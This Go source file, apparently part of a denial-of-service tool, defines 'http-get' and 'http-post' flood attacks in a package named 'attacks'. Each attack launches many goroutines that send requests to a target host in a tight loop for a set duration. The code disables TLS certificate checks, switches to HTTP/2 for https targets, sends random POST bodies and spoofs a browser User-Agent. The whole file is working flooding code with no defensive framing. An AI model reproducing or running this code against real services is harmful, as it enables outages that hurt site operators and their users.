package attacks

import (
	"bytes"
	"crypto/tls"
	"golang.org/x/net/http2"
	"math/rand"
	"net/http"
	"strings"
	"time"
)

type HttpGet struct {
	shouldStop bool
}
type HttpPost struct {
	shouldStop bool
}

func (h HttpPost) Name() string {
	return "http-post"
}

func (h HttpPost) Send(host string, port int, seconds int, size int, threads int) {
	for i := 0; i < threads; i++ {
		go func() {
			payload := make([]byte, size)
			rand.Read(payload)
			endAt := time.Now().Add(time.Second * time.Duration(seconds))
			client := &http.Client{}
			client.Transport = &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
			//overriding the default parameters
			if strings.HasPrefix(host, "https") {
				println("Setting dat http2")
				client.Transport = &http2.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
			}
			req, _ := http.NewRequest(http.MethodPost, host, bytes.NewBuffer(payload))
			req.Header.Set("User-Agent",
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36")
			req.Header.Set("Content-Type", "application/json")

			for time.Now().Before(endAt) {
				resp, err := client.Do(req)
				if err != nil {
					//println(err.Error())
					continue
				}
				// Close body to prevent a "too many files open" error
				err = resp.Body.Close()
			}
		}()
	}
}

func (h HttpPost) Stop(host string, port int) {
	//TODO implement me
	panic("implement me")
}

func (h HttpGet) Name() string {
	return "http-get"
}

func (h HttpGet) Send(host string, port int, seconds int, size int, threads int) {
	for i := 0; i < threads; i++ {
		go func() {
			endAt := time.Now().Add(time.Second * time.Duration(seconds))
			client := &http.Client{}
			//overriding the default parameters
			client.Transport = &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
			//overriding the default parameters
			if strings.HasPrefix(host, "https") {
				client.Transport = &http2.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
			}
			req, _ := http.NewRequest(http.MethodGet, host, nil)
			req.Header.Set("User-Agent",
				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36")
			req.Header.Set("Accept", "*/*")
			req.Header.Set("Keep-Alive", "true")
			req.Header.Set("Accept-Encoding", "gzip, deflate, br")
			req.Header.Set("Accept-Language", "en-US,en;q=0.9")
			for time.Now().Before(endAt) {
				resp, err := client.Do(req)
				if err != nil {
					println(err.Error())
					continue
				}
				// Close body to prevent a "too many files open" error
				err = resp.Body.Close()
				resp = nil
			}
		}()
	}
}

func (h HttpGet) Stop(host string, port int) {
	//TODO implement me
	panic("implement me")
}
